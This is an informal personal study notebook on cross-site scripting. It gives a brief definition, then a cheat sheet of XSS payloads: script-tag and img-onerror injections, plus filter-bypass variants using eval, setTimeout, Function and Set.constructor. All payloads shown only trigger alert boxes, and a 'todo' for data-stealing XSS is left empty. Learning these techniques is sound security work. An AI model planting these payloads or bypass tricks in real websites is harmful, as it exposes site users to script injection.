    # Klein
    Calvin Security Learning stuff lol
    NOTEBOOK sorta, slightly unorganized, catagorized but could be neater.

    "-" is a makeshift bulletpoint, not apart of whats typed after. eg 
    -  'lol = "'lol" 
    and not =/=
    "-  'lol"



    #Cross Site Scripting

    Cross Site Scripting (XSS) attacks are a type of injectoin, in which scripts are injected into an otherwise 
    trusted and reputable website. During XXS, attacker utilizes the webapp as a catalyst to send malicious code
    to another *end user.

    Some I like to give a crack are;



XSS in HTML/Applications
Basic Payload


- <script>alert('XSS')</script>
- <scr<script>ipt>alert('XSS')</scr<script>ipt>
- "><script>alert("XSS")</script>

  
  
  
XSS in HTML/Applications
Img tag payload

- <img src=x onerror=alert('XSS');>
- "><img src=x onerror=alert("XSS");>
- <img src=x onerror=alert(String.fromCharCode(88,83,83));>

  
  
  
Bypass word blacklist with code evaluation

  
- eval('ale'+'rt(0)');
- setTimeout('ale'+'rt(2)');
- setInterval('ale'+'rt(10)');
- news Function('ale'+'rt(1)')();
- Set.constructor`alert(14)```;
- Set.constructor('ale'+'rt(13)')();


XSS that nicks data todo lol [][][[]


 






































